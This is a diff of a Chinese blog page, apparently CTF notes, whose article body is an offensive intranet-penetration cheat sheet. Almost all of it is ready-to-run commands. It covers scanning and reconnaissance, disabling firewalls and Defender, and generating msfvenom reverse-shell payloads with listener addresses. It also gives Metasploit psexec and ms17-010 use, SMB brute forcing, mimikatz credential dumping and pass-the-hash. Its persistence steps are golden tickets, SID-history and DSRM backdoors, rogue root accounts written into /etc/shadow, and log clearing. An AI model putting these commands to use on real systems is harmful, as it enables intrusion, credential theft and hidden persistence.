@@ -10,7 +10,7 @@
 <meta name="description" content="内网安全">
 <meta name="author" content="Rural Bee">
 <link rel="canonical" href="https://ruralbee.github.io/posts/ctf/ctf_intranet/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.435fd7d00645589c1a1147f7b5b62b3a2bb66105a0e78ee419ba5010b59305d0.css" integrity="sha256-Q1/X0AZFWJwaEUf3tbYrOiu2YQWg547kGbpQELWTBdA=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5383ad15d511330a28046e58be749b9993bc009a779247c92ba27718a372d5e8.css" integrity="sha256-U4OtFdURMwooBG5YvnSbmZO8AJp3kkfJK6J3GKNy1eg=" rel="preload stylesheet" as="style">
 <link rel="icon" href="https://ruralbee.github.io/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="https://ruralbee.github.io/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="https://ruralbee.github.io/favicon-32x32.png">
@@ -99,7 +99,7 @@
   "keywords": [
     "CTF", "内网"
   ],
-  "articleBody": "内网渗透 Kali 探测命令 netdiscover\nnetdiscover -i eth0 -r 192.168.111.0/24 探测网卡下同段存在主机 namp\nnmap 192.168.111.129` # 探测存在的服务\rnmap -T4 -sC -sV 192.168.1.8 -p: 指定端口扫描范围\r-F：扫描比缺省少的端口\r-A：使能系统探测、版本检测、脚本扫描、路由追踪\r-O：探测指定IP的相关数据。\r-sP：主机探测\r-sL:列出需要扫描的目标，不扫描\r-sn:只做ping扫描，不做端口扫描\r-Pn：跳过主机发现，视所有主机都在线\r-PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现\r-PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现\r-PO[Protocol list]：基于IP协议字段的ping扫描\r-n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析\r--dns-servers : 指定DNS 服务器\r--system-dns:调用系统的DNS服务器\r--traceroute：显示追踪到目标的路径\r-sS/sT/sA/sW/sM:TCP扫描\r-sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放\r-sT是全连接扫描会和服务器建立完整的三次握手，效率低\r-sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件\r-sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包\r-sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准\r-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文\r-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。\r-sY/sZ:SCTP协议INIT或cookie-echo扫描\r-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测\r-b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 Linux 常见命令 uname -a # 获取所有版本信息\runame -m # 获取Linux内核架构\rcat /proc/version # 获取内核信息 cat /etc/*-release # 发布信息\rcat /etc/issue # 发布信息\rhostname # 获取主机名\rcat /etc/passwd # 列出系统所有用户 cat /etc/group # 列出系统所有组 w # 查看目前登录的用户\rwhoami # 查看当前用户 id # 查看当前用户信息 sudo -l # 列出目前用户可执行与无法执行的指令 ps aux # 查看进程信息 ls -la /etc/cron* # 查看计划任务\rifconfig -a # 列出网络接口信息 cat /etc/network/interfaces # 列出网络接口信息 arp -a # 查看系统arp表 route # 打印路由信息\rnetstat -anplt # 打印本地端口开放信息 iptables -L # 列出iptable的配置规则\rnohup 命令 \u0026 #后台运行 Windows 初步收集 查看基本信息命令 ipconfig /all # 查看本机ip，所在域\rroute print # 打印路由信息\rnet view # 查看局域网内其他主机名\rnet view /domain # 查看主域信息\rarp -a # 查看arp缓存\rnet start # 查看开启了哪些服务\rnet share # 查看开启了哪些共享\rnet config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域\recho %PROCESSOR_ARCHITECTURE% // 查看系统体系结构\rsysteminfo // 查看操作系统信息\rnslookup god.org\t#nslookup直接解析域名服务器\rnet user # 查看本机用户列表\rnet user /domain # 查看域用户\rnet localgroup administrators # 查看本地管理员组（通常会有域用户）\rnet computers # 查看连接的电脑\rnet view /domain # 查看有几个域\rnet user \"用户名\" /domain # 获取指定域用户的信息\rnet group /domain # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）\rnet group \"组名\" /domain # 查看域中某工作组\rnet group \"domain admins\" /domain # 查看域管理员的名字\rnet group \"domain computers\" /domain # 查看域中的其他主机名\rnet group \"doamin controllers\" /domain # 查看域控制器（可能有多台）\rnet group \"Enterprise Admins\" /domain // 查看域管理员组\rnet accounts /domain #查看域密码信息\rnltest /domain_trusts #查看域信任信息 net添加用户 net user \"username\" \"password\" /add #添加账户名和密码的用户, 不用双引号也可以\rnet localgroup administrators \"username\" /add #将用户添加到本地管理员中 net共享盘符连接 net use # 查看与本机的共享链接\rnet view \\\\IP #查看远程主机开启的默认共享\rnet share # 查看本机开启了哪些共享\rnet share ipc$ # 开启本机ipc共享\rnet share c$ # 开启本机c盘共享\rnet use \\\\IP\\ipc$ \"password\" /user:\"username\" #建立空连接\rnet use z: \\\\IP\\c$ \"password\" /user:\"username\" #建立共享盘符\rnet use \\\\IP\\ipc$ /del #删除空连接\rnet use z: /del #删除本机映射的z盘 net use * /del #删除本机所有映射和IPC$连接 dir \\\\192.168.xx.xx\\c$\\user # 查看192.168.xx.xx c盘user目\r录下的文件\rcopy mimikatz.exe \\\\192.168.138.138\\c$ #复制文件到目标ip的c盘下面 计划任务 schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务\rschtasks /create /tn \"taskName\" /tr C:\\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p \"Liu78963\" #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName\rschtasks /delete /tn taskName #删除计划任务 netstat 查看端口是否开放 netstat -ano | find \"3389\" 开启3389命令 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 查看进程并删除 tasklist | findstr \"artifact\"\rtaskkill /pid 2888 -f 关闭防火墙\n本地关闭 netsh advfirewall set allprofiles state off net stop windefend\rnetsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes #防火墙设置白名单 - 远程关闭\rnet use \\\\192.168.93.10\\ipc$ \"dc123.com\" /user:\"administrator\"\rsc \\\\192.168.93.10 create unablefirewall binpath= \"netsh advfirewall set allprofiles state off\"\rsc \\\\192.168.93.10 start unablefirewall\rnet use \\\\192.168.93.10\\ipc$ /del 开启远程桌面 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #开启远程桌面功能 程序异常弹窗解决\n关闭所有程序异常弹窗 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f\rreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"Disabled\" /t REG_DWORD /d 1 /f\rreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"LoggingDisabled\" /t REG_DWORD /d 1 /f\rreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontSendAdditionalData\" /t REG_DWORD /d 1 /f - 开启所有程序异常弹窗\rreg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /f\rreg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v Disabled /f\rreg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v LoggingDisabled /f\rreg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v DontSendAdditionalData /f 注意：win7下的弹窗错误程序为WerFault.exe，使用计划任务不会出现弹窗错误\nwmic命令执行 net use \\\\192.168.7.7\\ipc$ \"1qaz@WSX\" /user:administrator #建立ipc链接\rwmic /node:192.168.7.7 process call create \"cmd.exe /c ipconfig \u003ec:\\ip.txt\" #执行cmd命令并将结果保存在txt文档中\rtype \\\\192.168.7.7\\C$\\ip.txt #查看执行结果\r或\rwmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create \"cmd /c ipconfig \u003e c:\\1.txt\" 启用dsrm登录 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -name \"DsrmAdminLogonBehavior\" -value 2 -propertyType DWORD #powershell\r或\rreg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 修改注册表抓明文(win10或2012R2以上，未验证） reg add HKLM/SYSTEM/CurrentControlSet/Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 其他命令 netsh winsock reset #重启网络 横向移动 ping扫描 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr \"TTL=\" 用Ping命令探测内网主机 MSF MSF生成Windows木马命令 反向链接木马msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.131 lport=6000 -f exe \u003eshell.exe 反向链接木马操作 msfconsole\ruse exploit/multi/handler\rset payload windows/meterpreter/reverse_tcp\rset lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致\rset lport 2222 #设置监听端口，与frpc中的local_port一致\rexploit MSF生成Linux木马命令 反向链接木马 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf \u003e shell.elf 反向链接木马操作 msfconsole\ruse exploit/multi/handler\rset payload linux/x64/meterpreter/reverse_tcp\rset lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致\rset lport 2222 #设置监听端口，与frpc中的local_port一致\rexploit MSF生成Linux系统的Java网站木马命令 木马msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=2222 -f jsp \u003e shell.jsp 链接操作 msfconsole\ruse exploit/multi/handler\rset payload linux/x64/meterpreter/reverse_tcp\rset lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致\rset lport 2222 #设置监听端口，与frpc中的local_port一致\rexploit MSF常见命令 getuid #获取当前账号权限\rgetsystem #获取system权限\rrun post/windows/manage/enable_rdp #关闭windows防火墙\rrun post/windows/gather/smart_hashdump 获取window哈希\rrun autoroute -s 192.168.52.0/24 #添加路由，在木马上使用\rautoroute -p #查看路由，在密码上使用\rroute add 192.168.138.0 255.255.255.0 1 #添加路由在msf上使用\rroute print #查看路由在msf上使用\rrun post/windows/gather/enum_patches #查看补丁情况\rsetg Proxies socks5:127.0.0.1:1080 #设置代理\rshow options lhost #显示lhost的设置 psexec传递 （确保已经设置好路由） use exploit/windows/smb/psexec\rset payload windows/x64/meterpreter/bind_tcp\rset rhost 10.10.10.10\rset SMBUser administrator\rset SMBPass 1qaz@WSX\rrun MSF使用ms17-010开启3389 use auxiliary/admin/smb/ms17_010_command\rset COMMAND REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal\\\" \\\"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f set rhost x.x.x.x MSF使用mimikatz（被kiwi取代） migrate [PID] #如果是x64需要这个步骤\rload kiwi #加载模块\rhelp kiwi #查看帮助\rcreds_all：列举所有凭据\rcreds_kerberos：列举所有kerberos凭据\rcreds_msv：列举所有msv凭据\rcreds_ssp：列举所有ssp凭据\rcreds_tspkg：列举所有tspkg凭据\rcreds_wdigest：列举所有wdigest凭据\rdcsync：通过DCSync检索用户帐户信息\rdcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID\rgolden_ticket_create：创建黄金票据\rkerberos_ticket_list：列举kerberos票据\rkerberos_ticket_purge：清除kerberos票据\rkerberos_ticket_use：使用kerberos票据\rkiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令\rlsa_dump_sam：dump出lsa的SAM\rlsa_dump_secrets：dump出lsa的密文\rpassword_change：修改密码\rwifi_list：列出当前用户的wifi配置文件\rwifi_list_shared：列出共享wifi配置文件/编码 MSF smb爆破密码 use auxiliary/scanner/smb/smb_login\rset SMBUser administrator\rset PASS_FILE /root/fuzzDicts/passwordDict/top500.txt\rset rhost 192.168.93.10\rexploit MSF 令牌偷取（用于提权） getuid #查看当前token\ruse incognito #加载incognito\rlist_tokens -u #列出AccessToken\rimpersonate_token \"TEST\\adminitrator\" #模拟TEST\\adminitrator用户\rrev2self #返回到之前的AccessToken权限 MSF存活主机探测 use auxiliary/scanner/discovery/udp_probe\rset rhosts 192.168.183.0/24\rset threads 5\rexploit MSF powershell 攻击 use exploit/multi/script/web_delivery\rset target 2 # 选择使用powershell类型的payload\rset payload windows/meterpreter/reverse_tcp\rset lport 2222\rset lhost 192.168.135.150\rexploit MSF清除痕迹 run event_manager -i\rrun event_manager -c 小工具使用 Mimitakz使用 获取账号密码 privilege::debug #权限提升\rsekurlsa::logonPasswords #获取账号密码 获取NTLM hash privilege::debug\rtoken::elevate\rlsadump::sam hash攻击 （会弹出一个cmd窗口，有风险） privilege::debug\rsekurlsa::pth /domain:DC /user:Administrator /ntlm:e8bea972b3549868cecd667a64a6ac46\r#DC是域控的名称 ntlm是上述获得结果 Eeathworm使用 -l listenport open a port for the service startup. // 为服务启动打开一个端口。\r-d refhost set the reflection host address. // 设置反连主机地址。\r-e refport set the reflection port. // 设置反连端口。\r-f connhost set the connect host address . // 设置连接主机地址。\r-g connport set the connect port. // 设置连接端口。\r-t usectime set the milliseconds for timeout. The default value is 1000 // 设置超时的毫秒数。默认值值为1000\r-s state setup the function. // 状态设置功能。共有六种ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen\rssocksd rcsocks rssocks 为socket5 正向代理，反向代理，正反向代理\rlcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。\rlcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。\rlcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。 proxychains4 使用方法 proxychains4 nmap -p 3389 -Pn -sT 192.168.52.141 # 需要配置/etc/proxychains4.conf文件 -Pn和-sT必须要有， 192.168.52.141是要扫描的内网地址 chisel使用 端口转发 #将本地的11111端口转发到服务器上的8000端口 正向链接\r./chisel server -p 12345 chisel.exe client 192.168.61.128:12345 11111:127.0.0.1:8000\r反向链接\rchisel.exe server -p 12345 --reverse\r./chisel client 192.168.61.129:12345 R:11111:127.0.0.1:8000 socks代理 本地1088端口代理服务器 正向链接\rchisel.exe server -p 12345 --socks5\r./chisel client 192.168.61.129:12345 1088:socks\r反向链接\r./chisel server -p 12345 --reverse --socks5\r./chisel client 192.168.111.2:12345 R:1088:socks 权限维持 黄金票据 导出域控制器用户密码或hash privilege::debug\rlsadump::lsa /patch # 专用于在域控制器上导出用户密码或hash 切换到用户主机下使用minikatz生成票据 kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi\r# kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi 修改票据 kerberos::purge #先清空所有票据\rkerberos::ptt ticket.kirbi #再将生成的票据注入域用户主机Windows7中\rkerberos::tgt #查看系统票据 SID History域后门 添加恶意用户 net user aaa Aaa123456 /add #添加用户名为aaa密码为Aaa123456的用户\r使用mimikatz将域管理员的SID添加到恶意域用户\nprivilege::debug\rsid::patch\rsid::add /sam:aaa /new:Administrator //将管理员Administrator的SID添加到用户aaa的SID History属性中 DSRM 后门 修改DSRM账户（需要远程登录调用cmd窗口，有危险） ntdsutil // 进入ntdsutil\rset dsrm password // 设置DSRM账户的密码\rreset password on server null // 在当前域控制器上恢复DSRM密码\r// 输入新密码\r// 重新输入新密码\rq //退出DSRM密码设置模式\rq // 退出ntdsutil DSRM与域用户同步（于第一步类似，不必重复） ntdsutil // 进入ntdsutil set dsrm password // 设置DSRM账户的密码\rsync from domain account domainusername // 使DSRM的密码和指定的domainusername域用户的密码同步\rq //退出DSRM密码设置模式 q // 退出ntdsutil 启用DSRM登录 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -name \"DsrmAdminLogonBehavior\" -value 2 -propertyType DWORD #powershell\r或\rreg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 #cmd方式 mimikatz获取NTLM hash （见mimikate用法） mimikatz使用hash攻击 （见mimikate用法） 提权 Linux提取放行普通用户提权 创建普通用户（密码123456） echo 'meme:x:1001:1001:,,,:/home/meme:/bin/bash' \u003e\u003e /etc/passwd\recho 'meme:x:1001:' \u003e\u003e /etc/group\recho 'meme:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::' \u003e\u003e /etc/shadow\recho 'meme:!::' \u003e\u003e /etc/gshadow 提权 echo 'ubuntu ALL=(ALL:ALL) ALL' \u003e\u003e /etc/sudoers #需要root权限才能做，不能使用sudo\rsudo su root #输入ubuntu用户的密码即可 创建root用户（密码123456） echo 'xi:x:0:0:root:/root:/bin/bash' \u003e\u003e /etc/passwd\recho 'xi:x:0:' \u003e\u003e /etc/group\recho 'xi:$6$Mig86wnH$wtvw4k8NpI7SVQ1Noc8OMb2nEg5gw5o4PBN81KIvF5Qw9WHDWo1XqD/5qt93bsJ8qarKAFERQLp/3AXAleGZn/:19625:0:99999:7:::' \u003e\u003e /etc/shadow\recho 'xi:!::' \u003e\u003e /etc/gshadow suid ps程序提权 前提条件，存在一个SUID程序，并且该程序调用ps命令 判断条件： find / -perm -u=s -type f 2\u003e/dev/null # 查找短暂拥有root权限的命令程序 修改环境变量，伪造ps命令 cd /tmp\recho \"/bin/bash\" \u003e ps\rchmod 777 ps\rexport PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序\r或 ln -s /bin/bash /tmp/ps 执行判断条件2中获取的程序。 警告：需要在反弹shell上使用，无法在webshell上成功执行和提权，需要全交交互式才行\nlinux ssh免登录方式 本地生成文件 ssh-keygen -t rsa #生成公钥和私钥\r(echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") \u003e public.txt #到处公钥\r(echo -e \"\\n\\n\"; cat /root/.ssh/id_rsa; echo -e \"\\n\\n\") \u003e private.txt #到处私钥 公钥上传 cp -avx ~/ubuntu/.ssh/id_rsa.pub ~/.ssh/authorized_keys #~/.ssh/authorized_keys 是上传的文件路径 echo '生成的.pub文件的内容即hello.pub' \u003e ~/.ssh/authorized_keys #写入文件 ",
+  "articleBody": "内网渗透 Kali 探测命令 netdiscover\nnetdiscover -i eth0 -r 192.168.111.0/24 探测网卡下同段存在主机 namp\nnmap 192.168.111.129` # 探测存在的服务 nmap -T4 -sC -sV 192.168.1.8 -p: 指定端口扫描范围 -F：扫描比缺省少的端口 -A：使能系统探测、版本检测、脚本扫描、路由追踪 -O：探测指定IP的相关数据。 -sP：主机探测 -sL:列出需要扫描的目标，不扫描 -sn:只做ping扫描，不做端口扫描 -Pn：跳过主机发现，视所有主机都在线 -PS/PA/PU/PY[portlist]：基于TCP（SYN、ACK）、UDP、SCTP的指定端口的主机发现 -PE/PP/PM：基于ICMP的echo、timestamp、network request的主机发现 -PO[Protocol list]：基于IP协议字段的ping扫描 -n/-R: -n表示不对目标最DNS解析，-R表示进行DNS解析，缺省为必要时候进行DNS解析 --dns-servers : 指定DNS 服务器 --system-dns:调用系统的DNS服务器 --traceroute：显示追踪到目标的路径 -sS/sT/sA/sW/sM:TCP扫描 -sS是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放 -sT是全连接扫描会和服务器建立完整的三次握手，效率低 -sA发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件 -sW 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包 -sM是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准 -sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文 -sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。 -sY/sZ:SCTP协议INIT或cookie-echo扫描 -sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测 -b :：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的 Linux 常见命令 uname -a # 获取所有版本信息 uname -m # 获取Linux内核架构 cat /proc/version # 获取内核信息 cat /etc/*-release # 发布信息 cat /etc/issue # 发布信息 hostname # 获取主机名 cat /etc/passwd # 列出系统所有用户 cat /etc/group # 列出系统所有组 w # 查看目前登录的用户 whoami # 查看当前用户 id # 查看当前用户信息 sudo -l # 列出目前用户可执行与无法执行的指令 ps aux # 查看进程信息 ls -la /etc/cron* # 查看计划任务 ifconfig -a # 列出网络接口信息 cat /etc/network/interfaces # 列出网络接口信息 arp -a # 查看系统arp表 route # 打印路由信息 netstat -anplt # 打印本地端口开放信息 iptables -L # 列出iptable的配置规则 nohup 命令 \u0026 #后台运行 Windows 初步收集 查看基本信息命令 ipconfig /all # 查看本机ip，所在域 route print # 打印路由信息 net view # 查看局域网内其他主机名 net view /domain # 查看主域信息 arp -a # 查看arp缓存 net start # 查看开启了哪些服务 net share # 查看开启了哪些共享 net config Workstation # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域 echo %PROCESSOR_ARCHITECTURE% // 查看系统体系结构 systeminfo // 查看操作系统信息 nslookup god.org\t#nslookup直接解析域名服务器 net user # 查看本机用户列表 net user /domain # 查看域用户 net localgroup administrators # 查看本地管理员组（通常会有域用户） net computers # 查看连接的电脑 net view /domain # 查看有几个域 net user \"用户名\" /domain # 获取指定域用户的信息 net group /domain # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作） net group \"组名\" /domain # 查看域中某工作组 net group \"domain admins\" /domain # 查看域管理员的名字 net group \"domain computers\" /domain # 查看域中的其他主机名 net group \"doamin controllers\" /domain # 查看域控制器（可能有多台） net group \"Enterprise Admins\" /domain // 查看域管理员组 net accounts /domain #查看域密码信息 nltest /domain_trusts #查看域信任信息 net添加用户 net user \"username\" \"password\" /add #添加账户名和密码的用户, 不用双引号也可以 net localgroup administrators \"username\" /add #将用户添加到本地管理员中 net共享盘符连接 net use # 查看与本机的共享链接 net view \\\\IP #查看远程主机开启的默认共享 net share # 查看本机开启了哪些共享 net share ipc$ # 开启本机ipc共享 net share c$ # 开启本机c盘共享 net use \\\\IP\\ipc$ \"password\" /user:\"username\" #建立空连接 net use z: \\\\IP\\c$ \"password\" /user:\"username\" #建立共享盘符 net use \\\\IP\\ipc$ /del #删除空连接 net use z: /del #删除本机映射的z盘 net use * /del #删除本机所有映射和IPC$连接 dir \\\\192.168.xx.xx\\c$\\user # 查看192.168.xx.xx c盘user目 录下的文件 copy mimikatz.exe \\\\192.168.138.138\\c$ #复制文件到目标ip的c盘下面 计划任务 schtasks /query /tn taskName #查看计划任务，不加/tn为所有计划任务 schtasks /create /tn \"taskName\" /tr C:\\shell.exe /sc once /st 18:05 /S 192.168.52.138 /RU System /RL HIGHEST /u administrator /p \"Liu78963\" #创建计划任务，18:05分启动，就启动一次，计划任务名称为taskName schtasks /delete /tn taskName #删除计划任务 netstat 查看端口是否开放 netstat -ano | find \"3389\" 开启3389命令 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 查看进程并删除 tasklist | findstr \"artifact\" taskkill /pid 2888 -f 关闭防火墙\n本地关闭 netsh advfirewall set allprofiles state off net stop windefend netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes #防火墙设置白名单 - 远程关闭\rnet use \\\\192.168.93.10\\ipc$ \"dc123.com\" /user:\"administrator\" sc \\\\192.168.93.10 create unablefirewall binpath= \"netsh advfirewall set allprofiles state off\" sc \\\\192.168.93.10 start unablefirewall net use \\\\192.168.93.10\\ipc$ /del 开启远程桌面 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #开启远程桌面功能 程序异常弹窗解决\n关闭所有程序异常弹窗 reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"Disabled\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"LoggingDisabled\" /t REG_DWORD /d 1 /f reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontSendAdditionalData\" /t REG_DWORD /d 1 /f - 开启所有程序异常弹窗\rreg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /f reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v Disabled /f reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v LoggingDisabled /f reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\" /v DontSendAdditionalData /f 注意：win7下的弹窗错误程序为WerFault.exe，使用计划任务不会出现弹窗错误\nwmic命令执行 net use \\\\192.168.7.7\\ipc$ \"1qaz@WSX\" /user:administrator #建立ipc链接 wmic /node:192.168.7.7 process call create \"cmd.exe /c ipconfig \u003ec:\\ip.txt\" #执行cmd命令并将结果保存在txt文档中 type \\\\192.168.7.7\\C$\\ip.txt #查看执行结果 或 wmic /node:192.168.7.7 /user:administrator /password:1qaz@WSX1qaz@WSX process call create \"cmd /c ipconfig \u003e c:\\1.txt\" 启用dsrm登录 New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -name \"DsrmAdminLogonBehavior\" -value 2 -propertyType DWORD #powershell 或 reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /f /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 修改注册表抓明文(win10或2012R2以上，未验证） reg add HKLM/SYSTEM/CurrentControlSet/Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 其他命令 netsh winsock reset #重启网络 横向移动 ping扫描 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr \"TTL=\" 用Ping命令探测内网主机 MSF MSF生成Windows木马命令 反向链接木马msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.100.131 lport=6000 -f exe \u003eshell.exe 反向链接木马操作 msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF生成Linux木马命令 反向链接木马 msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=4444 -f elf \u003e shell.elf 反向链接木马操作 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF生成Linux系统的Java网站木马命令 木马msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.48.136 lport=2222 -f jsp \u003e shell.jsp 链接操作 msfconsole use exploit/multi/handler set payload linux/x64/meterpreter/reverse_tcp set lhost 127.0.0.1 #设置监听ip，必须和frpc中的local_ip 一致 set lport 2222 #设置监听端口，与frpc中的local_port一致 exploit MSF常见命令 getuid #获取当前账号权限 getsystem #获取system权限 run post/windows/manage/enable_rdp #关闭windows防火墙 run post/windows/gather/smart_hashdump 获取window哈希 run autoroute -s 192.168.52.0/24 #添加路由，在木马上使用 autoroute -p #查看路由，在密码上使用 route add 192.168.138.0 